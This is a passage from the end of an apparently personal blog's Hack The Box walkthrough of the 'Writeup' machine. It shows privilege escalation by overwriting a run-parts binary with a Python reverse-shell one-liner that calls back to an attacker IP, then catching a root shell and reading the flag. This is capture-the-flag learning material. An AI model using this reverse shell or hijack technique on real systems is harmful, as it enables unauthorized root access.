</pre></table></code></div></div><p>On the <code class="language-plaintext highlighter-rouge">Writeup</code> machine:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>jkr@writeup:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.con
nect((</span><span class="se">\"</span><span class="s2">10.10.XXX.XXX</span><span class="se">\"</span><span class="s2">,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
([</span><span class="se">\"</span><span class="s2">/bin/sh</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">-i</span><span class="se">\"</span><span class="s2">]);'"</span> <span class="o">&gt;</span> /usr/local/sbin/run-parts
jkr@writeup:/tmp<span class="nv">$ </span><span class="nb">chmod </span>777 /usr/local/sbin/run-parts
</pre></table></code></div></div><p>Again on my machine (on another terminal):</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh jkr@writeup.htb
jkr@writeup.htb<span class="s1">'s password:

</span></pre></table></code></div></div><p>Again on my machine (listener):</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>connect to <span class="o">[</span>10.10.XXX.XXX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.138] 59722
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
</span></pre></table></code></div></div><p>We are in!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c"># cd /root</span>
<span class="c"># ls</span>
bin
root.txt
<span class="c"># cat root.txt</span>
eebaXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/cmsmadesimple/" class="post-tag no-text-decoration" >cmsmadesimple</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >ssh</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Writeup - rizemon's blog&url=https://rizemon.github.io/posts/writeup-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Writeup - rizemon's blog&u=https://rizemon.github.io/posts/writeup-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Writeup - rizemon's blog&url=https://rizemon.github.io/posts/writeup-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/haystack-htb/"><div class="card-body"> <span class="timeago small" > Nov 3, 2019 <i class="unloaded">2019-11-03T18:38:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Haystack</h3><div class="text-muted small"><p> I really felt that this machine resonated with me because of the Elastic Stack components running on it and I happened to be learning about them at that point of time XD Configuration The opera...</p></div></div></a></div><div class="card"> <a href="/posts/postman-htb/"><div class="card-body"> <span class="timeago small" > Mar 15, 2020 <i class="unloaded">2020-03-15T11:33:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Postman</h3><div class="text-muted small"><p> Despite the name of this box, it was nowhere related to Postman! This box was quite weird as I actually jumped straight to root instead of going to user first. Configuration The operating syste...</p></div></div></a></div><div class="card"> <a href="/posts/traverxec-htb/"><div class="card-body"> <span class="timeago small" > Apr 12, 2020 <i class="unloaded">2020-04-12T02:48:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Traverxec</h3><div class="text-muted small"><p> This box was the last Easy box of the year 2019 and it has made me realise that I really have went a long way since the start of my journey in HackTheBox. Configuration The operating systems th...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/swagshop-htb/" class="btn btn-outline-primary"><p>Hack The Box - Swagshop</p></a> <a href="/posts/haystack-htb/" class="btn btn-outline-primary"><p>Hack The Box - Haystack</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
